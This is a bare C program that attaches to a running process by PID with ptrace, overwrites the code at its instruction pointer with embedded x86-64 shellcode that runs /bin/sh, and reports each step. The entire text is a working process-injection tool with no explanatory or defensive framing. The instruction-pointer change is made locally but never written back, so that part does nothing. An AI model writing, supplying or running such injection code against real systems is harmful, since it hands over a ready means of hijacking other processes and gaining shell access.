#include <sys/user.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>

#define SHELLCODE_SIZE 32

unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";

int main(int argc, char *argv[]) {
  pid_t target;
  struct user_regs_struct regs;
  int syscall;
  long dst;

  if (argc != 2) {
    fprintf(stderr, "Usage: %s pid\n", argv[0]);
    exit(1);
  }

  target = atoi(argv[1]);
  printf("+ Tracing process %d\n", target);
  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
    perror("ptrace(ATTACH)");
    exit(1);
  }

  printf("+ Waiting for process\n");
  wait(NULL);
  printf("+ Getting registers\n");
  if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
    perror("ptrace(GETREGS)");
    exit(1);
  }

  printf("+ Injecting shell code at %p\n", (void*) regs.rip);

  int i;
  uint32_t *s = (uint32_t*) shellcode;
  uint32_t *d = (uint32_t*) regs.rip;

  for (i = 0; i < SHELLCODE_SIZE; i += 4, s++, d++) {
    if ((ptrace(PTRACE_POKETEXT, target, d, *s)) < 0) {
      perror("ptrace(POKETEXT)");
      exit(1);
    }
  }

  regs.rip += 2;

  exit(EXIT_SUCCESS);
}
